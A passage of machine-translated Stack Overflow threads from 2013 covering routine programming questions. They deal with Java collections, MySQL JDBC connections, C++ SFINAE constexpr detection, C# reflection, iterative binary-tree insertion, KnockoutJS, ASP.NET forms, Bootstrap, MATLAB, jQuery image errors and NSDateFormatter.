您是否尝试关闭屏幕更新以节省资源：

```
Application.screenupdating=false ' at the start
' do the work
Application.screenupdating=true ' at the end 
```

HTH 菲利普

# java - 存储字符串列表的最佳方法

> ID：15232743
> 
> 赞同：2
> 
> 时间：2013-03-05T19:45:48.350
> 
> 标签：java, arrays, string

存储和读取一个非常长的字符串的最佳方法是什么，每个条目都是另一个数组的索引？

现在我有这个

```
String indices="1,4,6,19,22,54,....." 
```

该字符串有多达十万个条目，所以我想也许我可以使用像 Linked List 这样的数据结构。有谁知道使用一个会更快吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:46:42.897

```
List<String> list = new ArrayList<String>();

list.add("1");
list.add("2"); 
```

您需要声明字符串类型的arraylist。然后添加到它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-05T19:53:29.923

这将取决于您将如何处理字符串（索引）和相应的数组。此外，这将取决于您将如何访问它们。

我建议您首先阅读有关在 java 中实现的数据结构的概述，特别是在[Collections Framework](http://docs.oracle.com/javase/tutorial/collections/index.html)中。

我们可以提供一些建议，但您必须向我们提供更多信息，特别是我在开头提到的那些（您想要什么，如何存储和访问这些数据，等等）。

例如，如果您需要快速访问索引数据，那么字符串可能甚至不是最好的方法。也许地图会更好。例如，索引可以是键，索引数组可以是映射的值。但这只是一个无效的例子，我强烈建议您向我们提供更多信息。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T20:20:03.857

我真的很喜欢使用 ArrayList 类，如果您喜欢使用数组、ArrayList 或 Collections Framework 的任何成员。会工作得很好。对于你想要做的事情。

```
ArrayList<String> indices = new ArrayList<String>();
indices.add(""); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-03-19T11:36:36.100

我有类似的预感，我想喜欢 1k 个字符串并解析它们（搜索目的是为了知道它是否包含项目）。

因此，我发现而不是使用 java 集合框架 -**映射或集合或列表**

**如果我将数据简单地存储在数组中并开始使用 for 循环解析数据，它会更快。**

您访问此链接并查看我们以微秒计算的实际输出。

[https://www.programcreek.com/2014/04/check-if-array-contains-a-value-java/](https://www.programcreek.com/2014/04/check-if-array-contains-a-value-java/)

因此，在未排序的数组（通常我们有）的情况下，使用简单的蛮力是赢家。

但是`arrays.BinarySearch()`，如果对数组进行排序，则为赢家。

# java - 如何使用 MS Access 等目录路径连接 MySQL 数据库文件（.sql）？

> ID：15232755
> 
> 赞同：0
> 
> 时间：2013-03-05T19:47:01.237
> 
> 标签：java, mysql, connection

对不起，也许这是我第二次问这个问题，因为没有得到任何答案。

这是我的代码

```
 try{
    File  f = new File("Database.sql");
    if(f.exists()){
        Class.forName("com.mysql.jdbc.Driver").newInstance();
        Connection con = DriverManager.getConnection("jdbc:mysql://localhost/"+f.getName(),"","");
    }else{
        f.createNewFile();
        System.out.println("file created");
        //also do the connection
    }
    }catch(Exception ex){
       System.out.println(ex.getMessage());
    } 
```

这是错误：

***通信链路故障 最后一个成功发送到服务器的数据包是 0 毫秒前。驱动程序没有收到来自服务器的任何数据包。***

这个问题的目的是：我正在为许多用户创建一个应用程序，问题是他们对计算机一无所知，我必须让它尽可能简单。

那么**有什么方法可以通过目录路径与 MYSQL 连接，例如 MS ACCESS 吗？**

或者还有其他建议吗？

谢谢 。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-05T19:53:53.820

AFAIK，您不能在 MySQL 的 JDBC url 中插入文件名。MySQL 需要运行，并且您需要通过其 TCP 端口连接到它。就像是：

```
jdbc:mysql://localhost:3306/yourDatabaseName 
```

请参阅[http://dev.mysql.com/doc/refman/5.6/en/connector-j-reference-configuration-properties.html](http://dev.mysql.com/doc/refman/5.6/en/connector-j-reference-configuration-properties.html)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-08T00:24:59.617

## 初步定义

“连接到*MySQL 数据库文件*”是不恰当的措辞。

一个实际上*连接*到一个 MySQL 数据库*服务器*，它允许*访问*一个*数据库*。所以必须有一个 MySQL 服务器可以连接，下面会详细介绍。

您的`Database.sql`文件是一个[数据库转储文件](http://en.wikipedia.org/wiki/Database_dump)，也就是说，一个哑（纯文本）文件。在解释 SQL 查询之后，您需要一个专门的过程来从中提取数据：数据库服务器。

您可能会假设可以连接到*文件*，因为您习惯于使用 MS Access 文件。我既不是 Java 专家，也不是 MS Access 专家，但我不明白从 Java 访问 MS Access“数据库”文件实际上意味着连接到一些中间件*服务器*，例如[Microsoft 的这个 ODBC thingy](http://www.microsoft.com/en-us/download/details.aspx?displaylang=en&id=13255)。

## 答案

无法通过目录路径连接到 MySQL 数据库*服务器。*[唯一的本地方式是](http://dev.mysql.com/doc/refman/5.5/en/connecting.html#option_general_protocol)：

*   TCP
*   本地套接字（仅限 Unix 服务器）
*   命名管道（仅限 Windows 服务器）
*   共享内存（仅限 Windows 服务器）

可能有一些第三方软件提供其他协议，我不知道，但它们都归结为同一个问题：必须有一个 MySQL 服务器在某个地方运行。

*再三考虑，实际上有一种方法可以在没有运行外部 MySQL 服务器的情况下访问 MySQL 数据：[嵌入式 MySQL 服务器 C 库](http://dev.mysql.com/doc/refman/5.5/en/libmysqld.html)。我自己从未尝试过，但它看起来是独立应用程序的可行选择。但是，如果您计划在多个进程或计算机之间共享相同的 MySQL 数据，我不认为这是一个理想的解决方案。*

## 解决方法

现在我了解到您正在构建一个 Java 桌面应用程序，该应用程序基于您拥有的 SQL 转储文件形式的数据，可能是从 MySQL 服务器转储的。如果您希望您的用户能够从这个 Java 应用程序访问这些数据，我可以看到一些选项：

*   在他们的计算机上安装 MySQL 服务器并将此转储加载到其中。很明显，但不切实际，如果我听得清楚的话。虽然我猜这个安装肯定可以由您的 Java 应用程序自动执行。

*   在您自己的机器上安装 MySQL 服务器，并使其可以从您的用户计算机访问。主要缺点：它需要连接您的用户。您可能还想为每个用户创建一个不同的数据库。

*   使用实际的无服务器数据库引擎，例如[SQLite](http://www.sqlite.org/)。这似乎是您的最佳选择。对于常规操作，它的 SQL 语法几乎与 MySQL 相同。它必须有大量的 JDBC 驱动程序。再说一次，我不是 Java 最好的顾问，但这[似乎](https://bitbucket.org/xerial/sqlite-jdbc)是一个认真的候选人。

# c++ - 使用 SFINAE 检测 constexpr

> ID：15232758
> 
> 赞同：37
> 
> 时间：2013-03-05T19:47:05.563
> 
> 标签：c++, templates, c++11, sfinae, constexpr

我正在升级一些 C++ 代码以利用 C++11 中的新功能。我有一个特征类，其中有几个函数返回基本类型，这些基本类型在大多数情况下（但并非总是）返回一个常量表达式。我想根据功能是否存在来做不同的事情`constexpr`。我想出了以下方法：

```
template<typename Trait>
struct test
{
    template<int Value = Trait::f()>
    static std::true_type do_call(int){ return std::true_type(); }

    static std::false_type do_call(...){ return std::false_type(); }

    static bool call(){ return do_call(0); }
};

struct trait
{
    static int f(){ return 15; }
};

struct ctrait
{
    static constexpr int f(){ return 20; }
};

int main()
{
   std::cout << "regular: " << test<trait>::call() << std::endl;
   std::cout << "constexpr: " << test<ctrait>::call() << std::endl;
} 
```

额外的`int`/`...`参数在那里，如果在*SFINAE*之后两个函数都可用，则通过重载分辨率选择第一个函数。

*使用Clang 3.2*编译和运行它显示：

```
regular: 0
constexpr: 1 
```

所以这似乎可行，但我想知道代码是否合法 C++11。特别是因为我的理解是*SFINAE*的规则已经改变。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-03-06T00:11:41.543

> **注意：** [我在这里提出了一个](https://stackoverflow.com/q/15248944/500104)关于 OPs 代码是否真的有效的问题。我在下面重写的示例在任何情况下都可以使用。

* * *

> 但我想知道代码是否合法 C++11

它是，虽然默认模板参数可能被认为有点不寻常。我个人更喜欢以下样式，这类似于您（阅读：我）编写特征来[检查函数的存在](https://stackoverflow.com/a/9154394/500104)，只是使用非类型模板参数并省略`decltype`：

```
#include <type_traits>

namespace detail{
template<int> struct sfinae_true : std::true_type{};
template<class T>
sfinae_true<(T::f(), 0)> check(int);
template<class>
std::false_type check(...);
} // detail::

template<class T>
struct has_constexpr_f : decltype(detail::check<T>(0)){}; 
```

[活生生的例子。](https://ideone.com/AaqMHa)

* * *

讲解时间~

您的原始代码有效^(†</sup> 因为默认模板参数的实例化点是其函数模板的实例化点，在您的情况下，意思是 in `main`，因此不能在此之前替换它。)

`§14.6.4.1 [temp.point] p2`

> 如果以使用该函数模板的默认参数定义的方式调用函数模板 [...] [...]，则默认参数的实例化点就是函数模板的实例化点 [... ...]。

在那之后，这只是通常的 SFINAE 规则。

* * *

†至少我认为是这样，标准中并不*完全*清楚。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-04-30T00:16:46.603

在@marshall-clow 的提示下，我整理了一个更通用的 type-trait 版本来检测`constexpr`. 我对它进行了建模[`std::invoke_result`](http://en.cppreference.com/w/cpp/types/result_of)，但是由于`constexpr`取决于输入，因此模板参数用于传入的值，而不是类型。

它有点有限，因为模板 args 只能是一[组有限的 types](http://eel.is/c++draft/temp.param#4) ，并且当它们到达方法调用时它们都是*const 。*如果您需要其他类型或引用参数的*非 const 左*值，您可以轻松地测试`constexpr`包装器方法。

 *所以更多的是练习和演示，而不是实际有用的代码。

并且使用[`template<auto F, auto... Args>`](https://stackoverflow.com/a/38044251/166389)使其仅 C++17，需要 gcc 7 或 clang 4。MSVC 14.10.25017 无法编译它。

```
namespace constexpr_traits {

namespace detail {

// Call the provided method with the provided args.
// This gives us a non-type template parameter for void-returning F.
// This wouldn't be needed if "auto = F(Args...)" was a valid template
// parameter for void-returning F.
template<auto F, auto... Args>
constexpr void* constexpr_caller() {
    F(Args...);
    return nullptr;
}

// Takes a parameter with elipsis conversion, so will never be selected
// when another viable overload is present
template<auto F, auto... Args>
constexpr bool is_constexpr(...) { return false; }

// Fails substitution if constexpr_caller<F, Args...>() can't be
// called in constexpr context
template<auto F, auto... Args, auto = constexpr_caller<F, Args...>()>
constexpr bool is_constexpr(int) { return true; }

}

template<auto F, auto... Args>
struct invoke_constexpr : std::bool_constant<detail::is_constexpr<F, Args...>(0)> {};

} 
```

[使用 wandbox 上的用例进行现场演示](https://wandbox.org/permlink/BskkPyebb2vUZICh)*

# c# - 尝试使用 SetValue 时对象与目标类型不匹配

> ID：15232763
> 
> 赞同：5
> 
> 时间：2013-03-05T19:47:20.150
> 
> 标签：c#, .net, reflection

```
public class ConflictSaver
{
    private readonly IEnumerable<CommonJobDataInfo> _conflictingJobData;
    private readonly DataAccessDataContext _dc;

    public ConflictSaver(IEnumerable<CommonJobDataInfo> conflictingJobData, DataAccessDataContext dc)
    {
        _conflictingJobData = conflictingJobData;
        _dc = dc;
    }

    public void Save()
    {
        foreach (var data in _conflictingJobData)
        {
            var type = data.ClientBaseObject.GetType();
            var formattedProperty = data.Property.Trim('.').ToUpper();
            foreach (var property in type.GetProperties())
            {
                var currentProperty = data.ClientBaseObject.GetType().GetProperties().First(t => t.Name.Trim() == property.Name.Trim());

                if(currentProperty.Name.ToUpper()== formattedProperty)
                {
                    if (data.UseServerValue)
                        currentProperty.SetValue(currentProperty, data.ServerValue, null);
                    else
                        currentProperty.SetValue(currentProperty, data.ClientValue, null);
                }
            }

        }
    }
} 
```

当我尝试调用 SetValue() 时，我得到**Object 与 Save() 函数中的目标类型不匹配。**我反省时发臭。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-05T19:50:36.800

看起来您使用了错误的重载，并传递了错误的对象：

```
if (data.UseServerValue)
    currentProperty.SetValue(data.ClientBaseObject, data.ServerValue);
else
    currentProperty.SetValue(data.ClientBaseObject, data.ClientValue); 
```

该属性属于`data.ClientBaseObject`，所以它应该是调用目标。该属性没有索引器，因此[如果您使用的是 .NET 4.5 或更高版本](http://msdn.microsoft.com/en-us/library/hh194291.aspx)，则可以完全跳过第三个参数。

# c++ - 二叉树堆栈溢出

> ID：15232764
> 
> 赞同：3
> 
> 时间：2013-03-05T19:47:23.480
> 
> 标签：c++, binary-tree, stack-overflow

[我根据此处找到的 Alex Alllain 的示例](http://www.cprogramming.com/tutorial/lesson18.html)制作了一棵二叉树。在向其中添加大约 5000-6000 个元素后，它会引发堆栈溢出异常。知道如何防止堆栈溢出吗？原因是`Insert()`它递归地调用自己。

**2013 年 3 月 6 日更新**

以下是我如何重构代码以避免堆栈溢出：

```
void Insert(Key_T key, Value_T val, QuickMapNode<Key_T, Value_T> *leaf)
{
    while (true)
        if(key < leaf->key)
        {
            if(leaf->left) leaf = leaf->left;
            else
            {
                leaf->left = new QuickMapNode<Key_T, Value_T>;
                leaf->left->key = key;
                leaf->left->val = val;
                leaf->left->parent = leaf;
                leaf->left->left = NULL;    // Sets the left child of the child node to null
                leaf->left->right = NULL;   // Sets the right child of the child node to null
                break;
            }  
        }
        else if (key >= leaf->key)
        {
            if(leaf->right) leaf = leaf->right;
            else
            {
                leaf->right = new QuickMapNode<Key_T, Value_T>;
                leaf->right->key = key;
                leaf->right->val = val;
                leaf->right->parent = leaf;
                leaf->right->left = NULL;  // Sets the left child of the child node to null
                leaf->right->right = NULL; // Sets the right child of the child node to null
                break;
            }
        }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-05T19:59:33.280

就像 Öö Tiib 所说，你应该改变`insert`为不递归。通过将要进入堆栈的数据存储在其他数据结构中，每个递归函数都可以变成非递归函数。这样，您可以将堆用于这些数据，并且没有堆栈上的函数调用开销（返回地址等）。您通常可以使用像堆栈一样使用的向量或列表：获取（并弹出）`back()`获取当前参数的向量，在当前代码将递归调用自身的地方，`push_back()`您将传递给递归函数调用的内容。

这是`insert()`您的链接中作为迭代版本的方法：

```
void btree::insert(int key, node *leaf)
{
  std::list<node*> leafs;
  leafs.push_back(leaf);

  while (leafs.size() > 0)
  {
    leaf = leafs.back();
    leafs.pop_back();
    if(key < leaf->key_value)
    {
      if(leaf->left!=NULL)
        leafs.push_back(leaf->left);
      else
      {
        leaf->left=new node;
        leaf->left->key_value=key;
        leaf->left->left=NULL;    //Sets the left child of the child node to null
        leaf->left->right=NULL;   //Sets the right child of the child node to null
      }  
    }
    else if(key>=leaf->key_value)
    {
      if(leaf->right!=NULL)
        leafs.push_back(leaf->right);
      else
      {
        leaf->right=new node;
        leaf->right->key_value=key;
        leaf->right->left=NULL;  //Sets the left child of the child node to null
        leaf->right->right=NULL; //Sets the right child of the child node to null
      }
    }
  }
} 
```

我运行了代码，它似乎工作。虽然它比递归版本慢得多，但不知道为什么会这样......两个版本都可以很好地处理 10000 个和更多元素，所以你的实现中可能还有其他问题......

实际上，像我们这里那样遍历二叉树时，不需要存储任何先前的信息，因为我们不进行任何回溯。一旦找到新元素的位置，我们就完成了。所以我们可以完全摆脱列表/向量：

```
void btree::insert(int key, node *leaf)
{
  while (leaf != NULL)
  {
    if(key < leaf->key_value)
    {
      if(leaf->left!=NULL)
        leaf = leaf->left;
      else
      {
        leaf->left=new node;
        leaf->left->key_value=key;
        leaf->left->left=NULL;    //Sets the left child of the child node to null
        leaf->left->right=NULL;   //Sets the right child of the child node to null
        return;
      }  
    }
    else if(key>=leaf->key_value)
    {
      if(leaf->right!=NULL)
        leaf = leaf->right;
      else
      {
        leaf->right=new node;
        leaf->right->key_value=key;
        leaf->right->left=NULL;  //Sets the left child of the child node to null
        leaf->right->right=NULL; //Sets the right child of the child node to null
        return;
      }
    }
  }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T19:53:20.417

使算法`insert`不是递归的。您只需要搜索要插入的位置，因此您不需要为此调用堆栈。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-05T20:04:54.163

由于缺乏提供的细节而进行猜测：假设最坏的情况，在 6000 次插入之后，堆栈深度全部为 6000 次递归调用。假设一个合理的堆栈帧大小可能为 20 字节 - 那么堆栈大小为 6000 * 20 = 120,000 字节。如果堆栈帧实际上是 160 字节（大 8 倍），则堆栈大小为 6000 * 160，略小于 1MB。我想知道......你的元素数量有限制吗？分配的堆栈大小是多少？
上面的评论告诉你如何实际解决问题（平衡树）。我可能会补充一点，几乎任何递归算法都可以转换为迭代算法——它没有那么优雅，需要努力才能让它正确，但是你不会填满堆栈。但是，如果确实存在（不仅仅是您认为存在）输入元素数量的限制，那么在我看来，您可以确定用于插入的堆栈框架的大小并使堆栈大小足够大以适合 #elements *堆栈帧大小，最坏的情况，加上堆栈上的任何额外内容。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-05T20:00:23.943

如上所述，最可能的原因是由于递归插入调用过多导致堆栈溢出

以下是不同的选项

1.  使用自平衡树[http://en.wikipedia.org/wiki/Self-balancing_binary_search_tree](http://en.wikipedia.org/wiki/Self-balancing_binary_search_tree)

2.  使用非递归树体面的算法。看这个例子[使用 c++ 在二叉树中的非递归添加函数](https://stackoverflow.com/questions/6637830/non-recursive-add-function-in-a-binary-tree-using-c)

# javascript - 多次引用 KnockoutJS 脚本会破坏标准行为

> ID：15232765
> 
> 赞同：0
> 
> 时间：2013-03-05T19:47:23.837
> 
> 标签：javascript, jquery, ajax, knockout.js

例如，

1.  我有 KO 已经注册的页面，并且有一个带有可观察属性“someProperty”的视图模型；
2.  我检查“someProperty”是否是 ko.isObservable(viewmodel.someProperty) 的可观察属性 - 它返回“true”；
3.  我进行 ajax 调用以获取一些注册 KO 的 html 标记；
4.  现在，如果您检查 ko.isObservable(viewmodel.someProperty) 它将返回 false；

此外，所有手动添加的 KO 扩展都将丢失。它看起来像 jQuery ( [http://bugs.jquery.com/ticket/10066](http://bugs.jquery.com/ticket/10066) ) 中的错误（或功能）。

```
var viewModel = new function() {
            var self = this;
            this.serverData = {
                Controller: ko.observable(null),
                Enabled: ko.observable(false),
                Id: ko.observable(null),
                ParentId: ko.observable(null),
                Title: ko.observable(null),
                MaterialId: ko.observable(null),
                Alias: ko.observable(null)
            };
            this.treeData = {
                tree: ko.observable(null),
                node: ko.observable(null)
            };
            this.submit = submit;
            this.cancel = cancel;
            this.openMaterials = menuOptions.openMaterials;
}

// ...
var data = ko.utils.createUnobservable(viewModel.serverData);
// ...

(function(ko) {
    ko.utils = ko.utils || {};

    ko.utils.createUnobservable = function(observable) {
        var unobservable = {};
        (function() {
            for (var propertyName in observable) {
                var observableProperty = observable[propertyName];
                if (ko.isObservable(observableProperty) /* always 'false' after ajax */) {
                    unobservable[propertyName] = observableProperty();
                }
            }
        })();

        return unobservable;
    };

})(ko = ko || {}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T20:42:16.320

You could fix this by saving a copy of the `ko` global variable before you include the loaded ajax, and then restoring it afterwards.

```
var savedKo = window.ko;
.... // do the ajax thing
window.ko = savedKo; 
```

# c# - 如何从 ContentPlaceholder 将文本框表格行中的值获取到对象列表中

> ID：15232766
> 
> 赞同：1
> 
> 时间：2013-03-05T19:47:27.030
> 
> 标签：c#, asp.net, .net-4.0, visual-studio-2012, master-pages

我在页面上有一个空白文本框表，如果用户在任何文本框中放置任何内容，我想将该信息保存在对象列表中。这些都不是必需的，如果他们在任何一行输入任何内容，我想捕获它。这是对象：

```
public class Siblings
{
    public string SiblingName { get; set; }
    public string SiblingSchool { get; set; }
    public string SiblingID { get; set; }
} 
```

这是表格：

```
<asp:Content ID="SiblingContent" ContentPlaceHolderID="ContentPlaceHolderSibling" runat="server" >
<asp:Panel ID="SiblingInformation" runat="server" ViewStateMode="Inherit" Visible="False" >    
    <table id="SiblingTable" runat="server" > 
        <tr> 
            <td class="header">   
                <asp:Label ID="SiblingNameLabel" runat="server" Text="Sibling Full Name" ></asp:Label> 
            </td> 
            <td class="header">   
                <asp:Label ID="SiblingSchoolLabel" runat="server" Text="Sibling School"></asp:Label> 
            </td>
            <td class="header"> 
                <asp:Label ID="SiblingIDLabel" runat="server" Text="Sibling ID"></asp:Label> 
            </td>
        </tr> 
        <tr>
            <td class="field">
                <asp:TextBox ID="SiblingName1" runat="server" ></asp:TextBox>
            </td>
            <td class="field">
                <asp:TextBox ID="SiblingSchool1" runat="server" ></asp:TextBox>
            </td>
            <td class="field">
                <asp:TextBox ID="SiblingID1" runat="server" ></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td class="field">
                <asp:TextBox ID="SiblingName2" runat="server" ></asp:TextBox>
            </td>
            <td class="field">
                <asp:TextBox ID="SiblingSchool2" runat="server" ></asp:TextBox>
            </td>
            <td class="field">
                <asp:TextBox ID="SiblingID2" runat="server" ></asp:TextBox>
            </td>
        </tr>
        <tr>
            <td class="field">
                <asp:TextBox ID="SiblingName3" runat="server" ></asp:TextBox>
            </td>
            <td class="field">
                <asp:TextBox ID="SiblingSchool3" runat="server" ></asp:TextBox>
            </td>
            <td class="field">
                <asp:TextBox ID="SiblingID3" runat="server" ></asp:TextBox>
            </td>
        </tr>
    </table>
</asp:Panel> 
```

到目前为止，这是我尝试将用户数据放入对象列表中的内容（我必须一次执行此步骤以帮助自己了解正在发生的事情，如果您愿意，请合并）：

```
 ContentPlaceHolder mpContentPlaceHolder;
        Panel siblingPanel;
        Table siblingTable;
        TextBox tbox;
        int i = 1;
        mpContentPlaceHolder =
            (ContentPlaceHolder)Master.FindControl("ContentPlaceHolderSibling") as ContentPlaceHolder;
        if (mpContentPlaceHolder != null)
        {
            siblingPanel =
               (Panel)mpContentPlaceHolder.FindControl("SiblingInformation") as Panel;
            if (siblingPanel != null)
            {
                siblingTable =
                    (Table)siblingPanel.FindControl("SiblingTable");
                if (siblingTable != null)
                {
                    foreach (TableRow tr in siblingTable.Rows)
                    {
                        foreach (TableCell tc in tr.Cells)
                        {
                            foreach (Control c in tc.Controls)
                            {
                                if (c.GetType() == typeof(TextBox))
                                {
                                    tbox = (TextBox)c;
                                    if (!(String.IsNullOrWhiteSpace(tbox.Text)))
                                    {
                                        AllSiblings[i].SiblingName = tbox.Text;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } 
```

完成后我想要的是每个兄弟对象的会话，因此我可以稍后从另一个 ContentPlaceholder 访问它们。我试图为文本框提供 ID，以便确定这是名称、学校还是 ID，但我不知道如何使用它。谢谢 -

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T20:03:00.353

您可以更轻松地创建兄弟姐妹列表，只需执行以下操作：

```
private Siblings GetSiblings(string name, string school, string id)
{
Siblings siblings = new Siblings()
  {
     Name = name,
     School = school,
     Id= id

   }

return siblings;
}

private CreateSiblingsList()
{
   List<Siblings> list = new List<Siblings>();

  // First Sibling, carry on for rest siblings
   list.Add(GetSiblings(sib1name.Text,sibling1school.Text,sib1id.Text)); 
} 
```

对 N 个兄弟姐妹执行类似操作，并根据需要使用列表。您可以将列表声明为 global ，以防您需要在代码的其他部分。

请让这部分更清楚，你到底想说什么

> 完成后我想要的是每个兄弟对象的会话，因此我可以稍后从另一个 ContentPlaceholder 访问它们。我试图为文本框提供 ID，以便确定这是名称、学校还是 ID，但我不知道如何使用它。

# javascript - Twitter Bootstrap Carousel 自定义 - 外部导航控件和黑色边框

> ID：15232770
> 
> 赞同：1
> 
> 时间：2013-03-05T19:47:39.650
> 
> 标签：javascript, css, twitter-bootstrap, less

是否有一种简单的方法可以对[轮播](http://twitter.github.com/bootstrap/javascript.html#carousel)进行以下更改？

*   导航控件不作为图片的覆盖
*   图片周围有黑色边框（在此处放置导航控件）
*   外面也有字幕

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-05T19:52:28.543

这只是在引导样式表的链接下方创建自己的 CSS 表的问题。

*   要移动导航控件，请在以下位置调整位置：`.carousel-control.right`和`.carousel-control.left`
*   图像周围的边框：`.carousel-inner > .item > img, .carousel-inner > .item > a > img`
*   标题：`.carousel-caption`

通过 firebug 查看他们的 CSS 并进行自己的调整。同样，不要编辑引导 CSS 本身，用你自己的覆盖它。

# matlab - 如何在matlab中反转/反转向量或矩阵中元素的顺序？

> ID：15232771
> 
> 赞同：7
> 
> 时间：2013-03-05T19:47:40.390
> 
> 标签：matlab

我有一个矢量图

```
a = 1:4 
```

我想得到

```
[4 3 2 1] 
```

我应该使用哪个 matlab 函数？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-03-05T19:47:40.390

连续使用

```
fliplr(a) 
```

用于色谱柱

```
flipud(a) 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-03-05T21:05:33.690

另一种选择是使用索引

```
a(end:-1:1) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-10-10T09:21:36.943

如果要反转的数组是 range `a:b`，那么使用起来要快得多：

```
-(-b:-a) 
```

# jquery - Chrome 卡在这个 jquery 代码上，FF 很好

> ID：15232776
> 
> 赞同：0
> 
> 时间：2013-03-05T19:47:49.197
> 
> 标签：jquery

我有一个页面，我从维基百科加载了几张图片。维基百科图像有一个文件路径，您必须根据文件名计算该文件路径，然后您必须将其附加到以下内容：`http://upload.wikimedia.org/wikipedia/commons/thumb/`.

有两个问题。

1.  在少数图片中，url 有`/en/`而不是`/commons/'`，但无法知道何时。

2.  一些链接已经过时并且不返回任何图像，给我留下了一个丑陋的容器 div。

所以我首先尝试加载图像`commons`并编写一些代码来检查图像是否出错。如果是这样，它将替换`commons`为`en`。然后，如果图像仍然给出错误（意味着图片根本不存在），则代码将整个 src 替换为`''`并隐藏 div。

所有这一切都适用于 FF，但它在 Chrome 中崩溃。我得到无穷无尽`jquery.min.js:2 Uncaught RangeError: Maximum call stack size exceeded`的错误。如果有人能告诉我我的代码有什么问题并帮助我修复它，我将非常感激！

这是代码：

```
$('#imgid').error(function()
{
   $(this).one("error", function() {
         $(this).attr('src','');$(this).parent().parent().parent().hide();
  }).attr('src', $(this).attr('src').replace("/commons/", "/en/"));

}); 
```

蒂亚！

编辑：图像周围的 html 如下所示：

```
<div data-id="7551400" class="pin">
<div id="sc7551400" class="scrol">
 <a class="PinIm" target="_blank" name="http://upload.wikimedia.org/wikipedia/commons/c/c0/Cage_de_Faraday.jpg" href="">
   <img class="PinImageImg" alt="" src="http://upload.wikimedia.org/wikipedia/commons/thumb/c/c0/Cage_de_Faraday.jpg/155px-Cage_de_Faraday.jpg" style="width:155px" id="img-7551400">
    </a>
       </div>
       </div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T21:14:16.127

看起来您将 Chrome 置于无限循环中，试图替换 src。我会建议这样的事情：

```
$('img').error(function()
{  
    if(this.errorCount == undefined) this.errorCount = 0;
    if(this.errorCount < 1){
        var newSource = $(this).attr('src').replace("/en/", "/commons/");
        $(this).attr('src', newSource);
     }
    if(this.errorCount == 1){
        $(this).parents('div').hide();
    }

    this.errorCount++;
}); 
```

这会将错误计数设置为 0，并且在第一次通过后它将隐藏 div。如果需要，您可以使用它来完成几个选项。

这是一个小提琴，我将 commons 更改为 common，所以它会出错两次，第二次通过 div 被隐藏：http: [//jsfiddle.net/davidstetler/uvKvC/](http://jsfiddle.net/davidstetler/uvKvC/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T20:20:23.123

这可能是因为`attr('src', $(this).attr('src'...`

尝试这个：

```
$('#imgid').error(function()
{
   var src = $(this).attr('src');
   $(this).one("error", function() {
      $(this).attr('src','');
      $(this).parents('.pin').hide();
   }).attr('src', src.replace("/commons/", "/en/"));
}); 
```

# ios5 - NSDateFormatter 不同的基准年 iOS 5 和 iOS 6 解析一年中的某一天

> ID：15232777
> 
> 赞同：1
> 
> 时间：2013-03-05T19:47:57.787
> 
> 标签：ios5, ios6, nsdateformatter

我正在使用日历并发现 NSDateFormatter 存在问题，该问题在 iOS 5.0 和 iOS 6.0 上的行为不同。我尝试为一年中的某些日子创建日期。例如，我想知道哪一天是一年中的第 59 天。

为此，我使用 NSDateFormatter 并将其日期格式设置为“DDD”（一年中的三位数字），然后尝试解析包含日期的字符串。

```
NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
// just gettting rid of the timezone
[formatter setTimeZone:[NSTimeZone timeZoneForSecondsFromGMT:0]];
[formatter setDateFormat:@"DDD"];

NSMutableString *outPutString = [NSMutableString stringWithString:@"\n"];
for (int i = 1; i <= 366; i++)
{
    NSString *dayOfTheYearString = [NSString stringWithFormat:@"%i", i];
    [outPutString appendFormat:@"%3i: %@ string:(%@)\n", i, [formatter dateFromString:dayOfTheYearString], dayOfTheYearString];
}

NSLog(@"%@", outPutString);
[formatter release]; 
```

在 iOS 5.0 模拟器上运行它可以正常工作。控制台打印：

```
001: 1970-01-01 00:00:00 +0000 string:(1)
002: 1970-01-02 00:00:00 +0000 string:(2)
003: 1970-01-03 00:00:00 +0000 string:(3)
004: 1970-01-04 00:00:00 +0000 string:(4)
005: 1970-01-05 00:00:00 +0000 string:(5)
[...]
058: 1970-02-27 00:00:00 +0000 string:(58)
059: 1970-02-28 00:00:00 +0000 string:(59)
060: 1970-03-01 00:00:00 +0000 string:(60)
061: 1970-03-02 00:00:00 +0000 string:(61)
[...] 
```

但在 iOS 6.0 上，控制台打印：

```
001: 2000-01-01 00:00:00 +0000 string:(1)
002: 2000-01-02 00:00:00 +0000 string:(2)
003: 2000-01-03 00:00:00 +0000 string:(3)
004: 2000-01-04 00:00:00 +0000 string:(4)
005: 2000-01-05 00:00:00 +0000 string:(5)
[...]
058: 2000-02-27 00:00:00 +0000 string:(58)
059: 2000-02-28 00:00:00 +0000 string:(59)
060: 2000-02-29 00:00:00 +0000 string:(60)
061: 2000-03-01 00:00:00 +0000 string:(61)
[...] 
```

这是我的主要问题。由于 2000 年是闰年，我的以下计算结果在 iOS 5.0 和 iOS 6.0 之间有所不同。

我知道在询问第 x 天时有必要注意这一年是否是闰年。但是，如果我不提供有关年份的任何信息，我希望得到的日期是 1970 年！

那么如何强制 NSDateFormatter 在 1970 年创建（使用全球标准）日期，而 iOS 6.0 中没有其他提及？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T20:02:49.587

